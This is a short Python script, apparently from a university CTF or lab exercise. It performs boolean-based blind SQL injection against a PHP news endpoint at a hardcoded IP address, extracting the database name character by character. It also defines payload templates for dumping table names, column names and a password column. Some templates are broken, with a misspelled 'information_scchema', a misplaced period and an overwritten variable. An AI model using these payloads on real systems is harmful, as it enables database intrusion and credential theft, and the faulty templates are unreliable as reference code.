# 学校：武汉大学
# 编写者：cjl
# 时间：2023/5/5:10:36
import requests
url = "http://58.240.236.231:27003/backend/content_detail.php?id=0%20"
inDatabase = "or substr((select database()),{1},1)='{0}'%23"
dbname = ''
inTable = "or substr((select group_concat(table_name) from information_scchema.tables where table_schema={2}).{1},1)='{0}'%23"
Table= ''
inTable = "or substr((select group_concat(column_name) from information_scchema.columns where table_schema={2}).{1},1)='{0}'%23"
inValue = "or substr((select group_concat(passwa) from {2}),{1},1)='{0}'%23"
t = "测试新闻"

for i in range(1,10):
    for j in range(30,126):
        payload = inDatabase.format(chr(j),i)
        print(i,j)
        #print(url+payload)
        rep = requests.get(url + payload)
        if t in rep.text:
            dbname += chr(j)
            print(dbname)
            break
print(dbname)